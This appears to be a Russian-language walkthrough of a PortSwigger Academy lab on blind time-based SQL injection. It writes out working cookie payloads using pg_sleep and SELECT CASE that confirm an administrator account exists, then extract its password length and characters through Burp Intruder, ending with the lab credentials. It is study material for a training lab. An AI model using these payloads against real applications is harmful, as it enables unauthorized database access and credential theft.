Перейдем на главную страницу, и найдем запрос содержащий cookie в `Proxy` -> `HTTP history` и отправим его в `Repeater`
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/1.%20SQL%20injection/11.%20Blind%20SQL%20injection%20with%20time%20delays%20and%20information%20retrieval/pics%20for%20walktrough/1.png)

Убедимся, что приложение подвержено SQLi, и вызовем временной дилэй с помощью команды `pg_sleep()`, в качестве доказательства, что приложение подвержено SQLi
```
Cookie: TrackingId=52J9UudClzkZ05jK'|| (SELECT pg_sleep(10))--;
```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/1.%20SQL%20injection/11.%20Blind%20SQL%20injection%20with%20time%20delays%20and%20information%20retrieval/pics%20for%20walktrough/2.png)
Добавим конструкцию `SELECT CASE` и видим что ушло на 10 секунд в сон
```
Сookie: TrackingId=52J9UudClzkZ05jK'|| (SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END)--;
```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/1.%20SQL%20injection/11.%20Blind%20SQL%20injection%20with%20time%20delays%20and%20information%20retrieval/pics%20for%20walktrough/3.png)
С помощью делая смотрим, что УЗ `administrator` действительно существует, так как ушел в дилэй на 10 секунд
```
Cookie: TrackingId=52J9UudClzkZ05jK'|| (SELECT CASE WHEN (username='administrator') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM USERS)--;
```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/1.%20SQL%20injection/11.%20Blind%20SQL%20injection%20with%20time%20delays%20and%20information%20retrieval/pics%20for%20walktrough/4.png)
Далее нам необходимо узнать длину пароля. Чтобы сделать это удобно и эффективно отправим запрос в Intruder и изменим наш запрос на 
```
Cookie: TrackingId=52J9UudClzkZ05jK'|| (SELECT CASE WHEN (username='administrator' AND LENGTH(password)>§1§) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM USERS)--;
```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/1.%20SQL%20injection/11.%20Blind%20SQL%20injection%20with%20time%20delays%20and%20information%20retrieval/pics%20for%20walktrough/5.png)
Выберем значения для предполагаемой длины пароля от `1 до 30`
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/1.%20SQL%20injection/11.%20Blind%20SQL%20injection%20with%20time%20delays%20and%20information%20retrieval/pics%20for%20walktrough/6.png)
Установим значение запросов в 1 и запустим атаку
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/1.%20SQL%20injection/11.%20Blind%20SQL%20injection%20with%20time%20delays%20and%20information%20retrieval/pics%20for%20walktrough/7.png)
Дождемся окончания атаки (да, надо было поставить на поменьше)
выберем `Columns` -> `Responce received` и отсортировав по нему видим, что начиная с 20-значной длины пароля, ответ от страницы приходит быстрее, соответсвенно перестало выполняться условие на засыпание на 10 секунд
так как у нас было строгое условие, то `длина пароля = 20`
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/1.%20SQL%20injection/11.%20Blind%20SQL%20injection%20with%20time%20delays%20and%20information%20retrieval/pics%20for%20walktrough/8.png)

Теперь будем брутить пароль. Чтобы сделать это эффективно, выберем тип атаки `Cluster bomb` и изменим квери на 
```
Cookie: TrackingId=52J9UudClzkZ05jK'|| (SELECT CASE WHEN (username='administrator' AND SUBSTR(password,§1§,1)='§a§') THEN pg_sleep(6) ELSE pg_sleep(0) END FROM USERS)--; 
```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/1.%20SQL%20injection/11.%20Blind%20SQL%20injection%20with%20time%20delays%20and%20information%20retrieval/pics%20for%20walktrough/9.png)
Первый пэйлоад установим `Numbers` и выберем от 1 до 20 с шагом в 1, так как мы уже знаем, что пароль длиной в 20 символов
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/1.%20SQL%20injection/11.%20Blind%20SQL%20injection%20with%20time%20delays%20and%20information%20retrieval/pics%20for%20walktrough/10.png)
Второй пэйлоад, а значит символы в пароле - выберем `Simple list` и выберем символы `a-z` и `0-9` 

Запустим атаку
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/1.%20SQL%20injection/11.%20Blind%20SQL%20injection%20with%20time%20delays%20and%20information%20retrieval/pics%20for%20walktrough/11.png)
После завершения атаки, выберем `Columns` -> `Responce received` и отсортировав по нему результаты увидим, какой символ на какой позиции стоит в пароле
Получим пароль `al04e6ai891pgtn9vk5m`
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/1.%20SQL%20injection/11.%20Blind%20SQL%20injection%20with%20time%20delays%20and%20information%20retrieval/pics%20for%20walktrough/12.png)
Логинимся с кредами `administrator:al04e6ai891pgtn9vk5m` и получаем уведомление об успешно выполненной лабораторной работе
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/1.%20SQL%20injection/11.%20Blind%20SQL%20injection%20with%20time%20delays%20and%20information%20retrieval/pics%20for%20walktrough/13.png)
